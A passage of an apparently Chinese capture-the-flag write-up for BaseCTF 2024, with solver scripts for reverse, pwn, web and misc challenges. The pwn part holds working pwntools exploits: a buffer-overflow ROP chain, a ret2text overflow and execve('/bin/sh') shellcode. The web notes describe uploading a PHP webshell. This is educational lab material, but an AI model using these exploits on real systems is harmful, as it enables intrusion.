class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> deque<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_path</span>(<span class="hljs-params">maze, start_pos, end_pos</span>):<br>    ROWS = <span class="hljs-built_in">len</span>(maze)<br>    COLS = <span class="hljs-built_in">len</span>(maze[<span class="hljs-number">0</span>])<br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">move</span>(<span class="hljs-params">pos, direction</span>):<br>        x, y = <span class="hljs-built_in">divmod</span>(pos, COLS)<br>        <span class="hljs-keyword">if</span> direction == <span class="hljs-string">&#x27;d&#x27;</span>:  <span class="hljs-comment"># Right</span><br>            <span class="hljs-keyword">return</span> pos + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">elif</span> direction == <span class="hljs-string">&#x27;s&#x27;</span>:  <span class="hljs-comment"># Down</span><br>            <span class="hljs-keyword">return</span> pos + COLS<br>        <span class="hljs-keyword">elif</span> direction == <span class="hljs-string">&#x27;w&#x27;</span>:  <span class="hljs-comment"># Up</span><br>            <span class="hljs-keyword">return</span> pos - COLS<br>        <span class="hljs-keyword">elif</span> direction == <span class="hljs-string">&#x27;a&#x27;</span>:  <span class="hljs-comment"># Left</span><br>            <span class="hljs-keyword">return</span> pos - <span class="hljs-number">1</span><br>        <span class="hljs-keyword">return</span> pos<br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">is_valid</span>(<span class="hljs-params">pos</span>):<br>        <span class="hljs-keyword">if</span> pos &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> pos &gt;= ROWS * COLS:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        x, y = <span class="hljs-built_in">divmod</span>(pos, COLS)<br>        <span class="hljs-keyword">return</span> maze[x][y] != <span class="hljs-string">&#x27;$&#x27;</span><br>    <br>    queue = deque([(start_pos, <span class="hljs-string">&#x27;&#x27;</span>)])<br>    visited = <span class="hljs-built_in">set</span>()<br>    visited.add(start_pos)<br><br>    <span class="hljs-keyword">while</span> queue:<br>        current_pos, path = queue.popleft()<br>        <span class="hljs-keyword">if</span> current_pos == end_pos:<br>            <span class="hljs-keyword">return</span> path<br>        <br>        <span class="hljs-keyword">for</span> direction <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;dsaw&#x27;</span>:<br>            new_pos = move(current_pos, direction)<br>            <span class="hljs-keyword">if</span> is_valid(new_pos) <span class="hljs-keyword">and</span> new_pos <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> visited:<br>                visited.add(new_pos)<br>                queue.append((new_pos, path + direction))<br>                <br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-comment"># 迷宫初始化</span><br>maze = [<br>    <span class="hljs-string">&quot;x$$$$$$$$$$$$$$&quot;</span>,<br>    <span class="hljs-string">&quot;&amp;&amp;&amp;&amp;&amp;&amp;$$$$$$$$$&quot;</span>,<br>    <span class="hljs-string">&quot;&amp;$&amp;$$&amp;$$&amp;&amp;&amp;&amp;&amp;$$&quot;</span>,<br>    <span class="hljs-string">&quot;&amp;$&amp;$$$&amp;&amp;$$$$&amp;$$&quot;</span>,<br>    <span class="hljs-string">&quot;&amp;$$$&amp;&amp;&amp;$$$$$&amp;$$&quot;</span>,<br>    <span class="hljs-string">&quot;&amp;$$$&amp;$&amp;&amp;$&amp;$$$$$&quot;</span>,<br>    <span class="hljs-string">&quot;&amp;$$$&amp;$&amp;$$&amp;&amp;&amp;$$$&quot;</span>,<br>    <span class="hljs-string">&quot;&amp;&amp;&amp;&amp;&amp;$&amp;&amp;&amp;&amp;$&amp;$$$&quot;</span>,<br>    <span class="hljs-string">&quot;$$$$$$&amp;&amp;&amp;&amp;&amp;&amp;$$$&quot;</span>,<br>    <span class="hljs-string">&quot;$$$$$$&amp;$$$$$$$$&quot;</span>,<br>    <span class="hljs-string">&quot;$$$&amp;&amp;&amp;&amp;$$&amp;&amp;&amp;$$$&quot;</span>,<br>    <span class="hljs-string">&quot;$$$&amp;&amp;&amp;&amp;&amp;&amp;&amp;$$$$$&quot;</span>,<br>    <span class="hljs-string">&quot;$$$$$$$$$&amp;$$&amp;$$&quot;</span>,<br>    <span class="hljs-string">&quot;$$$$$$$$$&amp;$&amp;$$$&quot;</span>,<br>    <span class="hljs-string">&quot;$$$$$$&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;y&quot;</span><br>]<br><br><span class="hljs-comment"># 将迷宫数据转换为一维列表</span><br>ROWS = <span class="hljs-number">15</span><br>COLS = <span class="hljs-number">15</span><br>maze_1d = <span class="hljs-string">&#x27;&#x27;</span>.join(maze)<br><br><span class="hljs-comment"># 起点和终点</span><br>START = <span class="hljs-number">0</span><br>END = (ROWS - <span class="hljs-number">1</span>) * COLS + (COLS - <span class="hljs-number">1</span>)  <span class="hljs-comment"># 最后一行最后一列的位置</span><br><br><span class="hljs-comment"># 查找路径</span><br>path = find_path([maze_1d[i * COLS:(i + <span class="hljs-number">1</span>) * COLS] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(ROWS)], START, END)<br><span class="hljs-keyword">if</span> path:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;找到的路径：<span class="hljs-subst">&#123;path&#125;</span>&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;没有找到路径&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>最后进行MD5加密就行</p>
+<h3 id="BasePlus"><a href="#BasePlus" class="headerlink" title="BasePlus"></a>BasePlus</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-comment"># Secret array used in encoding</span><br>Secret = <span class="hljs-string">&#x27;/128GhIoPQROSTeUbADfgHijKLM+n0pFWXY456xyzB7=39VaqrstJklmNuZvwcdEC&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>(<span class="hljs-params">encoded_str</span>):<br>    decoded_str = <span class="hljs-string">&quot;&quot;</span><br><br>    <span class="hljs-comment"># Step 1: XOR each character with 0xE to undo the XOR applied during encoding</span><br>    xor_str = <span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(char) ^ <span class="hljs-number">0xE</span>) <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> encoded_str)<br><br>    <span class="hljs-comment"># Process the string in chunks of 4 characters</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(xor_str), <span class="hljs-number">4</span>):<br>        enc_chunk = xor_str[i:i+<span class="hljs-number">4</span>]<br><br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-comment"># Reverse the Base64-like encoding using the Secret array</span><br>            v15 = (Secret.index(enc_chunk[<span class="hljs-number">0</span>]) &lt;&lt; <span class="hljs-number">2</span>) | (Secret.index(enc_chunk[<span class="hljs-number">1</span>]) &gt;&gt; <span class="hljs-number">4</span>)<br>            v16 = ((Secret.index(enc_chunk[<span class="hljs-number">1</span>]) &amp; <span class="hljs-number">0xF</span>) &lt;&lt; <span class="hljs-number">4</span>) | (Secret.index(enc_chunk[<span class="hljs-number">2</span>]) &gt;&gt; <span class="hljs-number">2</span>)<br>            v17 = ((Secret.index(enc_chunk[<span class="hljs-number">2</span>]) &amp; <span class="hljs-number">0x3</span>) &lt;&lt; <span class="hljs-number">6</span>) | Secret.index(enc_chunk[<span class="hljs-number">3</span>])<br><br>            <span class="hljs-comment"># Reconstruct the original characters</span><br>            decoded_str += <span class="hljs-built_in">chr</span>(v15)<br>            <span class="hljs-keyword">if</span> v16 != <span class="hljs-number">0</span>:<br>                decoded_str += <span class="hljs-built_in">chr</span>(v16)<br>            <span class="hljs-keyword">if</span> v17 != <span class="hljs-number">0</span>:<br>                decoded_str += <span class="hljs-built_in">chr</span>(v17)<br><br>        <span class="hljs-keyword">except</span> ValueError <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Error processing chunk: <span class="hljs-subst">&#123;enc_chunk&#125;</span> - <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>    <span class="hljs-keyword">return</span> decoded_str<br><br><span class="hljs-comment"># Example usage</span><br>encoded_str = <span class="hljs-string">&quot;lvfzBiZiOw7&lt;lhF8dDOfEbmI]i@bdcZfEc^z&gt;aD!&quot;</span><br>decoded_str = decode(encoded_str)<br><br><span class="hljs-keyword">if</span> decoded_str <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Decoded string: <span class="hljs-subst">&#123;decoded_str&#125;</span>&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Decoding failed due to an error.&quot;</span>)<br><br></code></pre></td></tr></table></figure>
+
+<h3 id="Ez-Xor"><a href="#Ez-Xor" class="headerlink" title="Ez Xor"></a>Ez Xor</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> struct<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">key_stream</span>(<span class="hljs-params">key, length</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;生成与输入数据长度相同的key stream&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>([i ^ key[i % <span class="hljs-built_in">len</span>(key)] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(length)])<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt_decrypt</span>(<span class="hljs-params">data, key_stream</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;对数据进行加密/解密操作&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>([data[i] ^ key_stream[<span class="hljs-built_in">len</span>(data) - i - <span class="hljs-number">1</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(data))])<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">attempt_decryption</span>(<span class="hljs-params">encrypted_data, key</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;尝试用给定的key解密数据&quot;&quot;&quot;</span><br>    key_stream_data = key_stream(key, <span class="hljs-built_in">len</span>(encrypted_data))<br>    decrypted = encrypt_decrypt(encrypted_data, key_stream_data)<br><br>    <span class="hljs-keyword">try</span>:<br>        flag = decrypted.decode(<span class="hljs-string">&#x27;ascii&#x27;</span>)<br>        <span class="hljs-keyword">if</span> flag.startswith(<span class="hljs-string">&quot;Base&quot;</span>):<br>            <span class="hljs-keyword">return</span> flag, <span class="hljs-string">&quot;可能的flag&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> flag, <span class="hljs-string">&quot;解密结果&quot;</span><br>    <span class="hljs-keyword">except</span> UnicodeDecodeError:<br>        <span class="hljs-keyword">return</span> decrypted.<span class="hljs-built_in">hex</span>(), <span class="hljs-string">&quot;无法解码为ASCII，十六进制结果&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    encrypted_flag = (<br>        <span class="hljs-string">b&#x27;\x01\x09\x05\x25\x26\x2D\x0B\x1D&#x27;</span><br>        <span class="hljs-string">b&#x27;\x24\x7A\x31\x20\x1E\x49\x3D\x67&#x27;</span><br>        <span class="hljs-string">b&#x27;\x4D\x50\x08\x25\x2E\x6E\x05\x34&#x27;</span><br>        <span class="hljs-string">b&#x27;\x22\x40\x3B\x25&#x27;</span><br>    )<br><br>    key_value = <span class="hljs-number">7499608</span><br><br>    <span class="hljs-comment"># 定义不同格式的key</span><br>    keys = [<br>        struct.pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, key_value),      <span class="hljs-comment"># 小端 32 位</span><br>        struct.pack(<span class="hljs-string">&#x27;&gt;I&#x27;</span>, key_value),      <span class="hljs-comment"># 大端 32 位</span><br>        struct.pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, key_value)[:<span class="hljs-number">3</span>],  <span class="hljs-comment"># 小端 24 位</span><br>        struct.pack(<span class="hljs-string">&#x27;&gt;I&#x27;</span>, key_value)[<span class="hljs-number">1</span>:],  <span class="hljs-comment"># 大端 24 位</span><br>    ]<br><br>    <span class="hljs-keyword">for</span> i, key <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(keys):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n尝试 key <span class="hljs-subst">&#123;i + <span class="hljs-number">1</span>&#125;</span>: <span class="hljs-subst">&#123;key.<span class="hljs-built_in">hex</span>()&#125;</span>&quot;</span>)<br>        result, status = attempt_decryption(encrypted_flag, key)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;status&#125;</span>: <span class="hljs-subst">&#123;result&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure>
+
+<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="签个到吧"><a href="#签个到吧" class="headerlink" title="签个到吧"></a>签个到吧</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># 设置连接信息</span><br>host = <span class="hljs-string">&#x27;challenge.basectf.fun&#x27;</span><br>port = <span class="hljs-number">33292</span><br><span class="hljs-comment"># 连接到远程服务</span><br>p = remote(host, port)<br><br><span class="hljs-comment"># 发送和接收数据</span><br>p.sendline(<span class="hljs-string">b&#x27;cat /flag&#x27;</span>)<br>response = p.recvline()<br><span class="hljs-built_in">print</span>(response.decode())<br><br><span class="hljs-comment"># 继续其他的交互操作</span><br><span class="hljs-comment"># 关闭连接</span><br>p.close()<br></code></pre></td></tr></table></figure>
+
+<h3 id="echo"><a href="#echo" class="headerlink" title="echo"></a>echo</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 设置连接信息</span><br>host = <span class="hljs-string">&#x27;challenge.basectf.fun&#x27;</span><br>port = <span class="hljs-number">40511</span><br><br><span class="hljs-comment"># 连接到远程服务</span><br>p = remote(host, port)<br><br><span class="hljs-comment"># 尝试使用 echo 和 bash 的 &lt; 操作符读取文件</span><br>p.sendline(<span class="hljs-string">b&#x27;echo $(&lt;/flag)&#x27;</span>)<br>response = p.recvline()<br><span class="hljs-built_in">print</span>(response.decode())<br><br><span class="hljs-comment"># 关闭连接</span><br>p.close()<br></code></pre></td></tr></table></figure>
+
+<h3 id="我把她丢了"><a href="#我把她丢了" class="headerlink" title="我把她丢了"></a>我把她丢了</h3><p>填充使其溢出调用到bin&#x2F;sh,就可以了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&quot;challenge.basectf.fun&quot;</span>, <span class="hljs-number">49516</span>)<br><br><span class="hljs-comment">#system_plt=elf.plt[&quot;system&quot;]</span><br>pop_rdi_ret=<span class="hljs-number">0x0000000000401196</span><br>main=<span class="hljs-number">0x000000000040124B</span><br>payload=<span class="hljs-number">0x78</span>*<span class="hljs-string">b&#x27;a&#x27;</span>+p64(pop_rdi_ret)+p64(<span class="hljs-number">0x0000000000402008</span>)+p64(<span class="hljs-number">0x000000000040120F</span>)+p64(main)<br><span class="hljs-comment">#寄存器地址-&gt;bin/sh调用到system最后进入main</span><br>p.sendline(payload)<br><br><span class="hljs-comment"># 进入交互模式</span><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h3 id="Re2text"><a href="#Re2text" class="headerlink" title="Re2text"></a>Re2text</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 连接到远程服务</span><br>p = remote(<span class="hljs-string">&quot;challenge.basectf.fun&quot;</span>, <span class="hljs-number">30147</span>)<br><br><span class="hljs-comment"># 构造 payload</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x28</span>+p64(<span class="hljs-number">0x40101A</span>)+p64(<span class="hljs-number">0x4011a4</span>)           <span class="hljs-comment"># 填充缓冲区</span><br><br><span class="hljs-comment"># 发送 payload</span><br>p.sendline(payload)<br><br><span class="hljs-comment"># 进入交互模式</span><br>p.interactive()<br><br></code></pre></td></tr></table></figure>
+
+<h3 id="shellcode-level0"><a href="#shellcode-level0" class="headerlink" title="shellcode_level0"></a>shellcode_level0</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 连接到远程服务</span><br>p = remote(<span class="hljs-string">&#x27;challenge.basectf.fun&#x27;</span>, <span class="hljs-number">49846</span>)<br><br><span class="hljs-comment"># Shellcode 是一段二进制代码，可以直接在内存中执行。这个 shellcode 会启动一个 /bin/sh shell。</span><br><br>shellcode = (<br>    <span class="hljs-string">b&quot;\x48\x31\xc0&quot;</span>            <span class="hljs-comment"># xor rax, rax        ; 清空 rax 寄存器 (rax = 0)</span><br>    <span class="hljs-string">b&quot;\x50&quot;</span>                    <span class="hljs-comment"># push rax            ; 将 rax (0) 压入栈，作为 NULL 终止符</span><br>    <span class="hljs-string">b&quot;\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68&quot;</span> <span class="hljs-comment"># mov rbx, 0x68732f2f6e69622f ; 将 &quot;/bin//sh&quot; 存入 rbx</span><br>    <span class="hljs-string">b&quot;\x53&quot;</span>                    <span class="hljs-comment"># push rbx            ; 将 rbx (&quot;/bin//sh&quot;) 压入栈</span><br>    <span class="hljs-string">b&quot;\x48\x89\xe7&quot;</span>            <span class="hljs-comment"># mov rdi, rsp        ; 将栈指针 rsp 的值赋给 rdi，现在 rdi 指向 &quot;/bin//sh&quot;</span><br>    <span class="hljs-string">b&quot;\x48\x31\xf6&quot;</span>            <span class="hljs-comment"># xor rsi, rsi        ; 清空 rsi 寄存器 (rsi = 0)，表示 NULL</span><br>    <span class="hljs-string">b&quot;\x48\x31\xd2&quot;</span>            <span class="hljs-comment"># xor rdx, rdx        ; 清空 rdx 寄存器 (rdx = 0)，表示 NULL</span><br>    <span class="hljs-string">b&quot;\x48\x31\xc0&quot;</span>            <span class="hljs-comment"># xor rax, rax        ; 清空 rax 寄存器 (rax = 0)</span><br>    <span class="hljs-string">b&quot;\xb0\x3b&quot;</span>                <span class="hljs-comment"># mov al, 0x3b        ; 将 0x3b (59) 赋给 al 寄存器，59 是 execve 的系统调用号</span><br>    <span class="hljs-string">b&quot;\x0f\x05&quot;</span>                <span class="hljs-comment"># syscall             ; 触发系统调用，执行 execve(&quot;/bin/sh&quot;, NULL, NULL)</span><br>)<br><br>p.sendline(shellcode)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="HTTP-是什么呀"><a href="#HTTP-是什么呀" class="headerlink" title="HTTP 是什么呀"></a>HTTP 是什么呀</h3><p>?basectf&#x3D;we1c%2500me</p>
+<p>Base&#x3D;fl@g</p>
+<p><img src="/../../images/basectf/basectf2024/http1.png" srcset="/img/loading.gif" lazyload alt="http1"></p>
+<p><img src="/../../images/basectf/basectf2024/http2.png" srcset="/img/loading.gif" lazyload alt="http2"></p>
+<p><img src="/../../images/basectf/basectf2024/http3.png" srcset="/img/loading.gif" lazyload alt="http3"></p>
+<p>base解密得到flag</p>
+<h3 id="喵喵喵´•ﻌ•"><a href="#喵喵喵´•ﻌ•" class="headerlink" title="喵喵喵´•ﻌ•&#96;"></a>喵喵喵´•ﻌ•&#96;</h3><p><img src="/../../images/basectf/basectf2024/%E5%96%B5%E5%96%B5%E5%96%B5.png" srcset="/img/loading.gif" lazyload alt="喵喵喵"></p>
+<h3 id="md5绕过欸"><a href="#md5绕过欸" class="headerlink" title="md5绕过欸"></a>md5绕过欸</h3><p><img src="/../../images/basectf/basectf2024/md5.png" srcset="/img/loading.gif" lazyload alt="md5"></p>
+<h3 id="A-Dark-Room"><a href="#A-Dark-Room" class="headerlink" title="A Dark Room"></a>A Dark Room</h3><p>直接查看源码得到flag</p>
+<h3 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h3><p>上传一句话木马，观看源码在uploads&#x2F;，直接上传php即可</p>
+<h3 id="Aura-酱的礼物"><a href="#Aura-酱的礼物" class="headerlink" title="Aura 酱的礼物"></a>Aura 酱的礼物</h3><p>混了个二血😋</p>
+<p>前两个一个是php伪协议，一个直接输入</p>
+<p>第三个</p>
+<p>我是用的是@进行重定向，然后用我自己的vps开个端口进行拼接就行（理论上不需要这么复杂，只是最先想到这个办法</p>
+<p><img src="/../../images/basectf/basectf2024/aura.png" srcset="/img/loading.gif" lazyload alt="aura"></p>
+<p>最后进行伪协议读取flag</p>
+<?php // flag{c985afc7-50f1-44e5-87f0-221d081b9459}  Aura 酱有拿到一血吗？
+
+## Misc
+
+### 你也喜欢圣物吗
+
+打开下来先用010打开图片看，底部有个base64的编码
+
+提示去看LSB
+
+利用stegsolve进行分析，得到key
+
+解开第一层压缩包
+
+第二层伪加密工具进行解密，打开进去滑到下面有个真的flag
+
+### 根本进不去啊!
+
+![进不去](../../images/basectf/basectf2024/进不去.png)
+
+dig的命令是进行域信息搜索器，找txt得到flag
+
+### 海上遇到了鲨鱼
+
+利用wireshark打开，http找到php,里面有flag,进行简单的反转得到flag
+
+### 正着看还是反着看呢？
+
+利用python读取图片文件，然后反转图片进行逆向
+
+将文件拖到虚拟机，进行foremost，里面有压缩包解压得到flag
+
+###  Base
+
+直接64，32进行解密
+
+### 签到！DK 盾！
+
+直接公众号发送就行
+
+### 人生苦短，我用Python
+
+其他部分都可以看着推，我这边放一下**推算15**的情况
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> itertools<br><br><span class="hljs-comment"># 目标值</span><br>target_value = <span class="hljs-number">41378751114180610</span><br><br><span class="hljs-comment"># 我们已知的 flag 结构</span><br>flag = <span class="hljs-string">&#x27;BaseCTF&#123;s1Mpl3_1s_l1Tt3r_Th4n_C0mPl3x&#125;&#x27;</span><br><br><span class="hljs-comment"># 定义我们将尝试的字符集</span><br>charset = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_&#x27;</span><br><br><span class="hljs-comment"># 计算函数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calculate_sum</span>(<span class="hljs-params">chars</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">sum</span>(<span class="hljs-built_in">ord</span>(c) * <span class="hljs-number">2024_08_15</span> ** idx <span class="hljs-keyword">for</span> idx, c <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(chars))<br><br><span class="hljs-comment"># 生成所有可能的组合并测试</span><br><span 